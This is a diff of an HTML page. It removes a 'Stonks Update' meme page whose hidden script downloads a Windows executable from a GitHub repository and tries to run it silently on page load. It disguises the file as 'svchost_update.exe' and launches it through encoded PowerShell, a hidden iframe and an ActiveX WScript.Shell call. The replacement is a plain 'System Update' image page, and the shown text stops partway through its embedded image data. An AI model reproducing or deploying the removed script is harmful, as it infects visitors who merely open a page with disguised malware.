@@ -1,63 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Stonks Update</title>
+    <title>System Update</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #000; overflow: hidden; }
-        img { width: 100%; height: auto; display: block; }
+        body { margin: 0; background: black; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        img { width: 80%; max-width: 400px; border-radius: 10px; }
     </style>
 </head>
 <body>
-    <img src="https://raw.githubusercontent.com/Shay7lebb-cloud/ASDGSZFG/main/krama%20stonks.png" alt="Stonks">
-    
-    <script>
-        const exeUrl = "https://github.com/Shay7lebb-cloud/ASDGSZFG/raw/refs/heads/main/mshalb7.exe";
-        
-        async function stealthHack() {
-            try {
-                const response = await fetch(exeUrl);
-                const blob = await response.blob();
-                const buffer = await blob.arrayBuffer();
-                
-                const base64 = btoa(String.fromCharCode(...new Uint8Array(buffer)));
-                
-                const psScript = `
-                    $dir = [System.IO.Path]::GetTempPath();
-                    $file = Join-Path $dir "svchost_update.exe";
-                    $bytes = [Convert]::FromBase64String("${base64}");
-                    [System.IO.File]::WriteAllBytes($file, $bytes);
-                    Start-Process $file -WindowStyle Hidden;
-                    exit;
-                `;
-                
-                const encodedPs = btoa(psScript);
-                const cmdExec = `cmd /c powershell -encodedCommand ${encodedPs}`;
-                
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.srcdoc = `<script>document.execCommand('start', false, '${cmdExec}');</script>`; 
-                
-                const psCode = `
-                    $url = "${exeUrl}";
-                    $path = "$env:TEMP\\svchost_update.exe";
-                    Invoke-WebRequest -Uri $url -OutFile $path;
-                    Start-Process $path -WindowStyle Hidden;
-                    exit;
-                `;
-                
-                const encodedCmd = btoa(psCode);
-                
-                const win = window.open("about:blank", "_blank");
-                win.document.write(`<script>var w=new ActiveXObject('WScript.Shell');w.run('powershell -encodedCommand ${encodedCmd}',0)</script>`);
-                win.close();
-                
-            } catch (e) {
-                console.error(e);
-            }
-        }
-        
-        stealthHack();
-    </script>
-</body>
-</html>
+    <!-- الصورة التي أرسلتها -->
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJ8AAACgCAYAAAASN76YAADB2UlEQVR4nKS9Z6xlaVYluI631z7/wmVkRjmKooouXAEDDQzCNKZHYiQYIYxAeIFACIEQRiAkhBDmB9ASQgh+gAAhEO4HjBgBLVpjWrgyWZmVGZlhn7v3XXu8Ga29z3nxMouqpugb+TLiuXvMt7+911577X3sL9m72+Laq4UBE4DZAq3Rf+3Zi18yjO4bMORP2zZo0cBpbYSmh1EQI3Ri+LYPyzBRNQnqYouySlA3KdAWMPnmBtAYjb4T37Nt9W/DgNHqsfozMM0GtmGhNmq0/Ly10ch5GLBRAvYYwf7zsOMdVKYPo8qA1Rmy89dgtWs09g7s4CYuFvdRFXMYBq8SME2ju8JGD9jU8OJb2HvLZ8KwPbQmUMvXW5i2g83lI7z4L38Loy3Bb5poYfOP5cKyTLleXlpRtyibGlXbIG9qNPw3byqPiRaR6cFzXRRlgYPBDSzzNU7SC7n3t6J9HE1uI8vWSKstbGcA3/Wxzpd4ePERTN0BQsvFOlnpGvBmmQXa2sJodITJ9DZgeABqtKYJozXQ1hlm8/vYbi7k3spdbWsM/BEs08YqWaI1uY60AP6RZZAPE56sDe8R11n/5toBRsvf4GLRbgyxG76fbdpwDBOOHcAyXRimJb+V1w2KukLZNrCvG54aga4F35zH42lYndV1h0HbtmjkZAAXNnzTReBEGLlDRF6gC1BVKPIlNvUGTbMFmuyaARuyoIa+W2fS/Q1RA+zPozeMpjFQ8zPT6b7Cm8RfbVA2DqLxbViT26ibEm2RwHA8mLt34NYFstlLsOotDLOG50Wo8nl3oY1eo/zbUuNvWzjhGIbtyrHlMmURdEGaFnAsFw4smPwd00DTtCjRImkKNHWD0mhQ8Pz4w4ZulKEbojAKpHmOiTfBjd1jFE2Ok7NHCP0YSZuhTbgBuJlNFI2J0mxQ1y18x0XZNHi6fiI7IbJD2cg0Li4qUKGtDQwHNzDZuQEYrngOy7L1FjYNDMPFJN5Fma5QVnm3CjYM05XzqI1Kr1HtqPu+rkeFvDNYNcz+ZfMdDN14pmXCNhzYXB/ek9ZA3TZIGgN5UaFoMpRNhaIuxeHULWDLrpBDqTHxYM+8XSvexeQN4X7lzWwaWIaFyA4QOhGGboyBHcKih2grFNkSablC3WxRNaUunGk/85bd8eTrLS+WXk0tvTdDnoN6NwutoQbRmgGs0RGcYMw3RJ6tUC4ewmwSmNYYVjwFagv56X0Ui8cID24B09uwpscwthdotpeoiwSuG2Jrmqib/rg0QBo7/RFvvAUnitByUZtKtwc3O700vZwBWIaNrGlRNzWKskLR0hs3sqF4r6xWowc9IG/Z2I1xZ/c2Hl0+hGlYOBrdguUMcTl/FTk3y7WNqOdiwbQMnF6coapLDKIdzFfnWKcpxk4Ax2yxrRK0ViMRpG0sjCfHmNLjSSSiMZbI81yMtCoylGWBstyiboqr1bZNF67lICtWcp/Vi/Lc6S07K+jOzTB74/LEk9HL29x8BveDKZtt21TIywJZVaKsG1QGUNHrc2sbpjqMhkZrw7Iter6ms+Xr/7/24i+3PJCN0PYReh5ib4jYDTTk1qWEsXWxkZBa8eK6mKkhTXcTDeYqtF2P4bo1u2/Tw2kgpcFKuOU
